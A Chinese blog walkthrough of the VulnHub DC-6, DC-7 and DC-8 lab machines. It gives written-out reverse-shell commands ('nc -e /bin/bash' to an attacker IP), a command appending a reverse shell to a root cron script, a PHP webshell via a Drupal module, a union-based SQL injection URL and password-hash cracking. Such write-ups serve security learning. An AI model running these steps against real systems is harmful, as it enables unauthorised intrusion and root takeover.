<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011132114963.png"><img src="/vulnhub/image-20221011132114963.png" alt="image-20221011132114963"></a></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap <span class="attribute">--script</span>=getshell</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011132315607.png"><img src="/vulnhub/image-20221011132315607.png" alt="image-20221011132315607"></a></p>
<p>成功提权，然后我们查找<code>flag</code>【没输入回显有点小难受，但是不影响拿<code>flag</code>】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011132507052.png"><img src="/vulnhub/image-20221011132507052.png" alt="image-20221011132507052"></a></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Yb        dP<span class="number"> 888888 </span>88    <span class="number"> 88 </span>        8888b.   dP&quot;Yb  88b<span class="number"> 88 </span>888888 d8b </span><br><span class="line"> Yb  db  dP  88__  <span class="number"> 88 </span>   <span class="number"> 88 </span>         8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88&quot;&quot;  <span class="number"> 88 </span> .o<span class="number"> 88 </span> .o      8I  dY Yb   dP<span class="number"> 88 </span>Y88 88&quot;&quot;   `&quot;&#x27; </span><br><span class="line">   YP  YP   <span class="number"> 888888 </span>88ood8 88ood8     8888Y&quot;   YbodP <span class="number"> 88 </span> Y8<span class="number"> 888888 </span>(8) </span><br></pre></td></tr></table></figure>

<p><code>Congratulations!!!</code></p>
<p><code>Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and who have taken time to complete these little</code><br><code>challenges.</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>意思是：<br>恭喜！！！</p>
<p>希望你喜欢 DC-6。只是想向所有这些人表示衷心的感谢<br>谁提供了反馈，谁花时间完成了这些小事<br>挑战。</p>
<p>如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文。</p>
</blockquote>
<p><strong>一个旗子找完，游戏结束</strong></p>
<hr>
<h1 id="七、DC-7-中级"><a href="#七、DC-7-中级" class="headerlink" title="七、DC-7[中级]"></a>七、DC-7[中级]</h1><p><strong>only one flag</strong></p>
<blockquote>
<p><code>hint：</code><br><code>While it&#39;s kind of a logical progression from an earlier DC release (I won&#39;t tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. :-) If you need to resort to brute forcing or dictionary attacks, you probably won&#39;t succeed.</code></p>
<p><code>What you will need to do, is to think &quot;outside&quot; of the box.</code></p>
<p><code>Waaaaaay &quot;outside&quot; of the box. :-)</code></p>
<p>虽然这是较早的 DC 版本的一种合乎逻辑的进展（我不会告诉你是哪一个），但其中涉及到一些新概念，但你需要自己弄清楚这些。:-) 如果您需要使用暴力破解或字典攻击，您可能不会成功。</p>
<p>您需要做的是跳出框框思考。</p>
<p>Waaaaaay“在盒子外面”。:-)</p>
</blockquote>
<h2 id="信息收集-6"><a href="#信息收集-6" class="headerlink" title="信息收集"></a>信息收集</h2><p><code>nmap</code>扫描查看开放端口</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018195918528.png"><img src="/vulnhub/image-20221018195918528.png" alt="image-20221018195918528"></a></p>
<p>发现运行着<code>22</code>和<code>80</code>端口，<code>22</code>端口运行着<code>ssh</code></p>
<p>先看看框架和语言</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018194429569.png"><img src="/vulnhub/image-20221018194429569.png" alt="image-20221018194429569"></a></p>
<p><code>CMS</code>是<code>Drupal 8</code>，看来这是关键【好家伙，<code>DC1</code>重现】</p>
<p>再顺手扫一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018194353195.png"><img src="/vulnhub/image-20221018194353195.png" alt="image-20221018194353195"></a></p>
<p>看到有一个登录窗口页面</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018194531613.png"><img src="/vulnhub/image-20221018194531613.png" alt="image-20221018194531613"></a></p>
<p>那我们就先想办法怎么获得一个用户的账号密码</p>
<hr>
<h2 id="1-跳出框架"><a href="#1-跳出框架" class="headerlink" title="1.跳出框架"></a>1.跳出框架</h2><blockquote>
<p>这里我开始以为是思维的框架，结果是靶机的框架，我们需要用搜素工具，得到我们的信息，而不是死脑筋在靶机上苦苦找漏洞或者蛮用爆破</p>
<p>在实际的环境中，我们也是这样的，在网站之外获得网站的信息，这也是收集信息的一个重要的办法</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018200526154.png"><img src="/vulnhub/image-20221018200526154.png" alt="image-20221018200526154"></a></p>
<p>在网站的最底下我们发现了</p>
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@DC</span>7USER</span><br></pre></td></tr></table></figure>

<p>这应该是网站的搭建者，对于像这种小网站，一般可能是在一些平台，比如<code>github</code>上搭建、挂载的【比如我的博客】，所以在这些平台上，我们很有可能得到一些我们想要的敏感信息和文件</p>
<p>所以我们用<code>bing</code>查一下【国内搜索引擎很难搜到，谷歌要魔法，我写这<code>DC7</code>这几天不方便魔法，所以<code>bing</code>最好】</p>
<p>还真找到了</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Dc7User/</span>staffdb<span class="regexp">/blob/m</span>aster/config.php</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018201258802.png"><img src="/vulnhub/image-20221018201258802.png" alt="image-20221018201258802"></a></p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string"> &lt;?php </span>|<span class="string">                                                              </span>|</span><br><span class="line">|<span class="string"> ----- </span>|<span class="string"> ------------------------------------------------------------ </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $servername = &quot;localhost&quot;;                                   </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $username = &quot;dc7user&quot;;                                       </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $password = &quot;MdR3xOgB7#dW&quot;;                                  </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $dbname = &quot;Staff&quot;;                                           </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $conn = mysqli_connect($servername, $username, $password, $dbname); </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> ?&gt;                                                           </span>|</span><br></pre></td></tr></table></figure>

<p>得到账号和密码，以及数据库的名字，看来我们确实跳出了框架</p>
<p>我们利用账号密码在我们之前的网站登录一下试试</p>
<blockquote>
<p>$username &#x3D; “<code>dc7user</code>“;<br>$password &#x3D; “<code>MdR3xOgB7#dW</code>“;  </p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018201801467.png"><img src="/vulnhub/image-20221018201801467.png" alt="image-20221018201801467"></a></p>
<p>结果报错，看来这个账号并不是在这个页面登录的</p>
<h2 id="2-ssh登录"><a href="#2-ssh登录" class="headerlink" title="2.ssh登录"></a>2.ssh登录</h2><p>我们根据之前得到的信息知道，<code>22</code>端口运行着<code>ssh</code>，我们用其登录试试</p>
<blockquote>
<p>$username &#x3D; “<code>dc7user</code>“;<br>$password &#x3D; “<code>MdR3xOgB7#dW</code>“;  </p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018202130724.png"><img src="/vulnhub/image-20221018202130724.png" alt="image-20221018202130724"></a></p>
<p>好家伙，果然是<code>ssh</code>的账号密码</p>
<p>我们来找找有没有什么有用的东西</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018202308173.png"><img src="/vulnhub/image-20221018202308173.png" alt="image-20221018202308173"></a></p>
<p>我们先打开<code>backups</code>文件夹</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018202658047.png"><img src="/vulnhub/image-20221018202658047.png" alt="image-20221018202658047"></a></p>
<p>发现是两个<code>.gpg</code>文件</p>
<blockquote>
<p><code>gpg</code>文件<br>就是一个加密文件</p>
</blockquote>
<p>而我们现在没有信息和密码，所以我们再看看另一个文件</p>
<blockquote>
<p>返回上级目录<br><code>cat mbox</code> </p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018203146128.png"><img src="/vulnhub/image-20221018203146128.png" alt="image-20221018203146128"></a></p>
<p>发现是<code>root</code>用户命令执行的记录</p>
<p>发现了</p>
<blockquote>
<p><code>Database dump saved to /home/dc7user/backups/website.sql</code><br>&#x2F;&#x2F;数据库信息存入website.sql文件<br>&#x2F;&#x2F;然后root执行了加密脚本加密数据库文件</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018203403493.png"><img src="/vulnhub/image-20221018203403493.png" alt="image-20221018203403493"></a></p>
<h3 id="定时任务【cron（crond）】"><a href="#定时任务【cron（crond）】" class="headerlink" title="*定时任务【cron（crond）】"></a>*定时任务【cron（crond）】</h3><p>我们发现在<code>root</code>用户执行加密脚本之前有一个<code>Cron</code></p>
<blockquote>
<p><code>Cron</code>发现是定时任务，代表过一段时间就执行一次，以来更新数据库备份文件【<code>backups</code>】</p>
<p>这是个定时任务 用<code>root</code> 运行<code>/opt/scripts/backups.sh</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018203434313.png"><img src="/vulnhub/image-20221018203434313.png" alt="image-20221018203434313"></a></p>
<h3 id="关键思路"><a href="#关键思路" class="headerlink" title="*关键思路"></a>*关键思路</h3><p>查看下权限什么的，发现<code>www-data</code>拥有执行和写的权限，我们当前权限没有写权限，看来没办法动手脚了。</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018234503615.png"><img src="/vulnhub/image-20221018234503615.png" alt="image-20221018234503615"></a></p>
<h3 id><a href="#" class="headerlink" title></a></h3><p>但是如果我们获得了<code>www-data</code>的<code>shell</code> 那就可以写点东西进去，然后依靠<strong>计划任务</strong>，用<code>root</code>去运行，然后反弹<code>shell</code>，那么我们可以获得了<code>root</code>权限的<code>shell</code>了。</p>
<h2 id="3-drush命令对drupal修改用户名和密码"><a href="#3-drush命令对drupal修改用户名和密码" class="headerlink" title="3.drush命令对drupal修改用户名和密码"></a>3.<code>drush</code>命令对<code>drupal</code>修改用户名和密码</h2><p>我们按路径查看该脚本内容</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018203742731.png"><img src="/vulnhub/image-20221018203742731.png" alt="image-20221018203742731"></a></p>
<p>我们发现果然是个加密数据库文件的脚本，但是我们仍然不知道密码</p>
<p>但是我们发现了数据库文件似乎被更改过</p>
<p>出现了一个新的命令</p>
<blockquote>
<p><code>drush</code><br>&#x2F;&#x2F;drush命令是在drupal框架中进行配置的命令，可以修改用户名和密码，<br>&#x2F;&#x2F;但是drush必须在drupal安装目录下进行，所以我们可以按脚本给的<br><code>cd /var/www/html/</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018204531647.png"><img src="/vulnhub/image-20221018204531647.png" alt="image-20221018204531647"></a></p>
<blockquote>
<p><code>cd /var/www/html</code><br><code>drush user-password admin:123456</code><br>&#x2F;&#x2F;用户名<code>admin</code>和密码<code>123456</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018205540723.png"><img src="/vulnhub/image-20221018205540723.png" alt="image-20221018205540723"></a></p>
<p>然后成功修改用户<code>admin</code>的密码为<code>123456</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018212431462.png"><img src="/vulnhub/image-20221018212431462.png" alt="image-20221018212431462"></a></p>
<h2 id="4-登录网站"><a href="#4-登录网站" class="headerlink" title="4.登录网站"></a>4.登录网站</h2><p>当我们输入我们修改后的密码后，成功登录<code>admin</code>用户</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018212905392.png"><img src="/vulnhub/image-20221018212905392.png" alt="image-20221018212905392"></a></p>
<p>然后我们统合一下思路，我们进入了网站后，应该如何拿到<code>shell</code>，那肯定需要写木马或者反弹<code>shell</code></p>
<p>那么我们就需要找到可以修改并增加<code>php</code>文件的的地方</p>
<p>我们先打开<code>content</code>页面，发现有<code>开始.html</code>页面</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018212952593.png"><img src="/vulnhub/image-20221018212952593.png" alt="image-20221018212952593"></a></p>
<p>点开查看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018215114742.png"><img src="/vulnhub/image-20221018215114742.png" alt="image-20221018215114742"></a></p>
<p>发现可以修改内容，看来我们可以试试修改它，变成我们的木马文件</p>
<p>结果发现文件只能以<code>html</code>形式执行，而不能以<code>php</code>形式执行</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018215830844.png"><img src="/vulnhub/image-20221018215830844.png" alt="image-20221018215830844"></a></p>
<h3 id="添加php执行插件"><a href="#添加php执行插件" class="headerlink" title="添加php执行插件"></a>添加php执行插件</h3><p><code>drupal</code>框架可以添加<code>php</code>文件插件，从而能修改为<code>php</code>文件</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018220115382.png"><img src="/vulnhub/image-20221018220115382.png" alt="image-20221018220115382"></a></p>
<p>点击</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">install <span class="keyword">new</span> <span class="keyword">module</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018220912473.png"><img src="/vulnhub/image-20221018220912473.png" alt="image-20221018220912473"></a></p>
<p>在<code>url</code>里填写</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">https</span>://<span class="keyword">ftp</span>.drupal.org/<span class="built_in">files</span>/projects/php<span class="number">-8.</span>x<span class="number">-1.</span>x-dev.tar.gz</span><br></pre></td></tr></table></figure>

<p>然后<code>install</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018221952909.png"><img src="/vulnhub/image-20221018221952909.png" alt="image-20221018221952909"></a></p>
<p>但是我这里显示无法连接网站，那我们直接上传插件文件也是可以的</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018222047051.png"><img src="/vulnhub/image-20221018222047051.png" alt="image-20221018222047051"></a></p>
<p>然后添加成功</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018222109470.png"><img src="/vulnhub/image-20221018222109470.png" alt="image-20221018222109470"></a></p>
<p>然后在<code>FILTERS</code>处</p>
<p>启动插件【勾选】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018222451086.png"><img src="/vulnhub/image-20221018222451086.png" alt="image-20221018222451086"></a></p>
<p>最后记得还要<code>install</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018222512620.png"><img src="/vulnhub/image-20221018222512620.png" alt="image-20221018222512620"></a></p>
<p>然后我们的文件就可以以<code>php</code>文件形式执行了</p>
<h3 id="加入一句话木马"><a href="#加入一句话木马" class="headerlink" title="加入一句话木马"></a>加入一句话木马</h3><p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018232816262.png"><img src="/vulnhub/image-20221018232816262.png" alt="image-20221018232816262"></a></p>
<p>【记住<code>Text foromat</code>要改成<code>PHP code</code>】</p>
<p>然后保存即可</p>
<h2 id="5-蚁剑连接getshell"><a href="#5-蚁剑连接getshell" class="headerlink" title="5.蚁剑连接getshell"></a>5.蚁剑连接getshell</h2><p>因为我们是在<code>welcome</code>页面里插入一句话木马，所以直接连接靶机ip就行</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.133.146</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018232842168.png"><img src="/vulnhub/image-20221018232842168.png" alt="image-20221018232842168"></a></p>
<p>连接成功</p>
<p>启动虚拟终端</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018232923762.png"><img src="/vulnhub/image-20221018232923762.png" alt="image-20221018232923762"></a></p>
<p><code>getshell</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018233020910.png"><img src="/vulnhub/image-20221018233020910.png" alt="image-20221018233020910"></a></p>
<h2 id="6-反弹shell拿www-data"><a href="#6-反弹shell拿www-data" class="headerlink" title="6.反弹shell拿www-data"></a>6.反弹shell拿www-data</h2><p>我们先开始监听<code>9999</code>端口</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">9999</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018233321886.png"><img src="/vulnhub/image-20221018233321886.png" alt="image-20221018233321886"></a></p>
<p>我们在蚁剑的<code>shell</code>上</p>
<p>开始反弹<code>shell</code></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -e /bin/bash <span class="number">192.168.133.140</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018233814670.png"><img src="/vulnhub/image-20221018233814670.png" alt="image-20221018233814670"></a></p>
<p>然后拿到反弹<code>shell</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018233713840.png"><img src="/vulnhub/image-20221018233713840.png" alt="image-20221018233713840"></a></p>
<p>进入交互式shell</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018234804275.png"><img src="/vulnhub/image-20221018234804275.png" alt="image-20221018234804275"></a></p>
<h2 id="7-利用定时任务【cron】提权root"><a href="#7-利用定时任务【cron】提权root" class="headerlink" title="7.利用定时任务【cron】提权root"></a>7.利用定时任务【cron】提权<code>root</code></h2><p>我们向 <code>backups.sh</code>写入反弹<code>shell</code>命令</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;nc 192.168.133.140 12345 -e /bin/bash&quot;</span> &gt;&gt; /<span class="keyword">opt</span>/scripts/backups.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018235007598.png"><img src="/vulnhub/image-20221018235007598.png" alt="image-20221018235007598"></a></p>
<p>然后我们再开一个控制台开始监听<code>12345</code>端口</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018235124023.png"><img src="/vulnhub/image-20221018235124023.png" alt="image-20221018235124023"></a></p>
<p>然后我们等待定时任务执行，便可以拿到<code>shell</code>【时间有点久】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221019000112748.png"><img src="/vulnhub/image-20221019000112748.png" alt="image-20221019000112748"></a></p>
<p>连接成功后，到<code>root</code>目录查看<code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221019123852041.png"><img src="/vulnhub/image-20221019123852041.png" alt="image-20221019123852041"></a></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br></pre></td></tr></table></figure>


<p><code>Congratulations!!!</code></p>
<p><code>Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and all those who have taken the time to complete these little</code><br><code>challenges.</code></p>
<p><code>I&#39;m sending out an especially big thanks to:</code></p>
<p><code>@4nqr34z</code><br><code>@D4mianWayne</code><br><code>@0xmzfr</code><br><code>@theart42</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>意思是：<br>恭喜！！！</p>
<p>希望你喜欢 DC-7。只是想向所有这些人表示衷心的感谢<br>提供反馈的人，以及所有花时间完成这些小事的人<br>挑战。</p>
<p>我要特别感谢：</p>
<p>@4nqr34z<br>@D4mianWayne<br>@0xmzfr<br>@心42</p>
<p>如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文</p>
</blockquote>
<p><strong>一个旗子找完，游戏结束</strong></p>
<h1 id="八、DC8-初级"><a href="#八、DC8-初级" class="headerlink" title="八、DC8[初级]"></a>八、DC8[初级]</h1><p><strong>only one flag</strong></p>
<blockquote>
<p><code>hint:</code><br><code>This challenge is a bit of a hybrid between being an actual challenge, and being a &quot;proof of concept&quot; as to whether two-factor authentication installed and configured on Linux can prevent the Linux server from being exploited.</code></p>
<p><code>The &quot;proof of concept&quot; portion of this challenge eventuated as a result of a question being asked about two-factor authentication and Linux on Twitter, and also due to a suggestion by @theart42.</code></p>
<p><code>The ultimate goal of this challenge is to bypass two-factor authentication, get root and to read the one and only flag.</code></p>
<p><code>You probably wouldn&#39;t even know that two-factor authentication was installed and configured unless you attempt to login via SSH, but it&#39;s definitely there and doing it&#39;s job.</code></p>
<p>意思是：<br>这个挑战有点混合实际挑战和“概念证明”，即在 Linux 上安装和配置的双因素身份验证是否可以防止 Linux 服务器被利用。</p>
<p>这个挑战的“概念证明”部分最终是由于 Twitter 上关于双因素身份验证和 Linux 的问题，以及@theart42 的建议。</p>
<p>此挑战的最终目标是绕过双重身份验证，获取 root 权限并读取唯一标志。</p>
<p>除非您尝试通过 SSH 登录，否则您可能甚至不知道已安装和配置了双因素身份验证，但它肯定存在并且可以正常工作。</p>
</blockquote>
<h2 id="信息收集-7"><a href="#信息收集-7" class="headerlink" title="信息收集"></a>信息收集</h2><p> 先<code>nmap</code>扫一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221102234939357.png"><img src="/vulnhub/image-20221102234939357.png" alt="image-20221102234939357"></a></p>
<blockquote>
<p>发现<br><code>22</code>端口<br>运行着<code>ssh</code></p>
<p>80端口下<br>发现有个<code>include</code>页面，可能需要在这里上传木马拿shell<br>然后有<code>install.mysql.txt</code>，看来可能需要用到数据库</p>
</blockquote>
<p>再<code>dirsearch</code>扫一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221102235306844.png"><img src="/vulnhub/image-20221102235306844.png" alt="image-20221102235306844"></a></p>
<blockquote>
<p>发现有<code>/user/login</code>页面，猜测是登录后台的页面<br>后面找找有没有账号密码信息</p>
</blockquote>
<p>再看看<code>wapplzer</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103112318956.png"><img src="/vulnhub/image-20221103112318956.png" alt="image-20221103112318956"></a></p>
<h2 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><p>然后分析网站页面</p>
<p>发现在<code>details</code>时，<code>url</code>出现</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.147</span>/?nid=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103112255720.png"><img src="/vulnhub/image-20221103112255720.png" alt="image-20221103112255720"></a></p>
<p>看到注入处，再结合之前的<code>nmap</code>扫描的结果，有<code>mysql</code>安装，猜测可能存在<code>sql</code>注入</p>
<p>试试<code>sql</code>注入有没有反应</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.133.147</span>/?nid=-<span class="number">1</span> union select schema_name from information_schema.schemata--+</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103130411912.png"><img src="/vulnhub/image-20221103130411912.png" alt="image-20221103130411912"></a></p>
<p>看来确实是存在<code>sql</code>注入</p>
<p>手动注不难，完全没有过滤，但还是用<code>sqlmap</code>直接梭哈</p>
<p>数据库知道了</p>
<p>先看看表</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103131256965.png"><img src="/vulnhub/image-20221103131256965.png" alt="image-20221103131256965"></a></p>
<p>看到有个<code>users</code>列，查看有没有我们需要的后台登录的账号密码</p>
<p>发现有两个用户</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103131824229.png"><img src="/vulnhub/image-20221103131824229.png" alt="image-20221103131824229"></a></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin <span class="variable">$S</span><span class="variable">$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span></span><br><span class="line">john <span class="variable">$S</span><span class="variable">$DqupvJbxVmqjr6cYePnx2A891ln7lsuku</span><span class="regexp">/3if/</span>oRVZJaz5mKC2vF</span><br></pre></td></tr></table></figure>

<p>但是密码是加密的，我们用<code>john</code>爆破一下</p>
<p>先把密码写入密码文本<code>pass.txt</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103133656691.png"><img src="/vulnhub/image-20221103133656691.png" alt="image-20221103133656691"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103133745514.png"><img src="/vulnhub/image-20221103133745514.png" alt="image-20221103133745514"></a></p>
<p>然后就用<code>john</code>自带的密码本就行</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john <span class="keyword">pass</span>.txt</span><br></pre></td></tr></table></figure>

<p>但是再这里我用了<code>johny</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103134419589.png"><img src="/vulnhub/image-20221103134419589.png" alt="image-20221103134419589"></a></p>
<p>一个图形化的爆破工具</p>
<p>这里只得到<code>john</code>用户的密码</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">turtle</span></span><br></pre></td></tr></table></figure>

<h2 id="2-后台添加木马"><a href="#2-后台添加木马" class="headerlink" title="2.后台添加木马"></a>2.后台添加木马</h2><p>拿到账号密码后，我们到后台登录页面进行登录</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.147</span><span class="regexp">/user/</span>login</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103134815814.png"><img src="/vulnhub/image-20221103134815814.png" alt="image-20221103134815814"></a></p>
<p>登录成功，根据之前我们信息收集，在<code>nmap</code>得到的信息，我们需要找到上传木马或者修改文件内容的地方</p>
<p>在右上角我们看到有个<code>content</code></p>
<p>打开看看里面是不是可以修改</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103135017243.png"><img src="/vulnhub/image-20221103135017243.png" alt="image-20221103135017243"></a></p>
